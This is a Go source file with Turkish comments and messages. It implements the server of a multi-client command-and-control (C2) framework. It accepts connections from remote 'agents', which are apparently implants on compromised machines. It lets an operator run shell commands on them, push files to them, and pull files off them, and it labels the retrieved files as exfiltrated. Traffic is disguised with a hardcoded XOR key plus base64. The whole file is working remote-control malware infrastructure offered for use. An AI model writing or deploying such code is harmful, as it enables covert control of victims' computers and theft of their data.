package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
)

const secretKey = byte(0x5A)

type Agent struct {
	ID   int
	Conn net.Conn
	Addr string
}

var (
	agents     = make(map[int]*Agent)
	agentCount = 0
	mu         sync.Mutex
)

func encryptAndEncode(plainText string, key byte) string {
	data := []byte(plainText)
	for i := 0; i < len(data); i++ {
		data[i] = data[i] ^ key
	}
	return base64.StdEncoding.EncodeToString(data) + "\n"
}

func decodeAndDecrypt(cipherText string, key byte) (string, error) {
	cipherText = strings.TrimSpace(cipherText)
	decoded, err := base64.StdEncoding.DecodeString(cipherText)
	if err != nil {
		return "", err
	}
	for i := 0; i < len(decoded); i++ {
		decoded[i] = decoded[i] ^ key
	}
	return string(decoded), nil
}

func main() {
	listener, err := net.Listen("tcp", ":8080")
	if err != nil {
		fmt.Println("[-] Port dinlenemedi:", err)
		return
	}
	defer listener.Close()

	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				continue
			}

			mu.Lock()
			agentCount++
			id := agentCount
			agents[id] = &Agent{
				ID:   id,
				Conn: conn,
				Addr: conn.RemoteAddr().String(),
			}
			mu.Unlock()

			fmt.Printf("\n[+] YENİ AJAN BAĞLANDI! ID: %d | Adres: %s\nC2-Main> ", id, conn.RemoteAddr().String())
		}
	}()

	fmt.Println("[+] Multi-Client C2 Framework Başlatıldı. Port: 8080")
	fmt.Println("[*] Komutlar: 'sessions', 'interact <id>', 'exit'")

	klavyeOkuyucu := bufio.NewReader(os.Stdin)

	for {
		fmt.Print("C2-Main> ")
		girdi, _ := klavyeOkuyucu.ReadString('\n')
		girdi = strings.TrimSpace(girdi)

		if girdi == "" {
			continue
		}

		if girdi == "exit" {
			fmt.Println("[*] Tüm bağlantılar kapatılıyor...")
			break
		}

		if girdi == "sessions" {
			mu.Lock()
			if len(agents) == 0 {
				fmt.Println("[-] Aktif bağlı ajan yok.")
			} else {
				fmt.Println("\n--- AKTİF SEANSLAR ---")
				for id, agent := range agents {
					fmt.Printf("ID: %d | Cihaz Adresi: %s\n", id, agent.Addr)
				}
				fmt.Println("----------------------")
			}
			mu.Unlock()
			continue
		}

		if strings.HasPrefix(girdi, "interact ") {
			parcalar := strings.Split(girdi, " ")
			if len(parcalar) < 2 {
				fmt.Println("[-] Kullanım: interact <id>")
				continue
			}
			id, err := strconv.Atoi(parcalar[1])
			if err != nil {
				fmt.Println("[-] Geçersiz ID formatı.")
				continue
			}

			mu.Lock()
			targetAgent, varMi := agents[id]
			mu.Unlock()

			if !varMi {
				fmt.Printf("[-] ID %d olan bir seans bulunamadı.\n", id)
				continue
			}

			interactWithAgent(targetAgent, klavyeOkuyucu)
			continue
		}

		fmt.Println("[-] Bilinmeyen komut. Kullanabileceklerin: sessions, interact <id>, exit")
	}
}

func interactWithAgent(agent *Agent, klavyeOkuyucu *bufio.Reader) {
	fmt.Printf("[+] Seans %d ile tünel kuruldu. Ana menüye dönmek için 'back' yazın.\n", agent.ID)
	ajanOkuyucu := bufio.NewReader(agent.Conn)

	for {
		fmt.Printf("C2-Session[%d]> ", agent.ID)
		komut, _ := klavyeOkuyucu.ReadString('\n')
		temizKomut := strings.TrimSpace(komut)

		if temizKomut == "" {
			continue
		}

		if temizKomut == "back" {
			fmt.Println("[*] Seans arka plana alınıyor...")
			break
		}

		isDownload := strings.HasPrefix(temizKomut, "download ")
		isUpload := strings.HasPrefix(temizKomut, "upload ")

		// --- TERSİNE DOSYA TRANSFERİ (UPLOAD) MANTIĞI ---
		if isUpload {
			parcalar := strings.SplitN(temizKomut, " ", 2)
			if len(parcalar) < 2 || parcalar[1] == "" {
				fmt.Println("[-] Kullanım hatası! Örnek: upload local_dosya.txt")
				continue
			}
			localDosya := parcalar[1]

			// Sunucunun kendi diskindeki dosyayı oku
			dosyaIcerik, err := os.ReadFile(localDosya)
			if err != nil {
				fmt.Println("[-] Lokal dosya bulunamadı veya okunamadı:", err)
				continue
			}

			// Protokol Formatı: "upload <dosya_adı>|<base64_veri>"
			b64Icerik := base64.StdEncoding.EncodeToString(dosyaIcerik)
			ozelPaket := fmt.Sprintf("upload %s|%s", localDosya, b64Icerik)

			// Şifrele ve ajana postala
			agent.Conn.Write([]byte(encryptAndEncode(ozelPaket, secretKey)))
		} else {
			// Normal komutlar veya download emirleri doğrudan gider
			agent.Conn.Write([]byte(encryptAndEncode(temizKomut, secretKey)))
		}

		if temizKomut == "exit" {
			fmt.Printf("[-] Seans %d kapatıldı.\n", agent.ID)
			mu.Lock()
			delete(agents, agent.ID)
			mu.Unlock()
			break
		}

		// Ajandan gelecek cevabı bekle
		sifreliCevap, err := ajanOkuyucu.ReadString('\n')
		if err != nil {
			fmt.Printf("[-] Seans %d koptu.\n", agent.ID)
			mu.Lock()
			delete(agents, agent.ID)
			mu.Unlock()
			break
		}

		orijinalCevap, err := decodeAndDecrypt(sifreliCevap, secretKey)
		if err != nil {
			fmt.Println("[-] Veri çözme hatası:", err)
			continue
		}

		// Eğer download yaptıysak gelen veriyi diske yaz
		if isDownload && !strings.HasPrefix(orijinalCevap, "Hata:") {
			dosyaIcerigi, _ := base64.StdEncoding.DecodeString(orijinalCevap)
			yeniDosyaAdi := fmt.Sprintf("agent_%d_indirilen_%s", agent.ID, strings.SplitN(temizKomut, " ", 2)[1])
			_ = os.WriteFile(yeniDosyaAdi, dosyaIcerigi, 0644)
			fmt.Printf("[+] Sızdırıldı: %s olarak kaydedildi.\n", yeniDosyaAdi)
		} else {
			// Upload sonucu veya normal CMD çıktısı ekrana basılır
			fmt.Println(orijinalCevap)
		}
	}
}
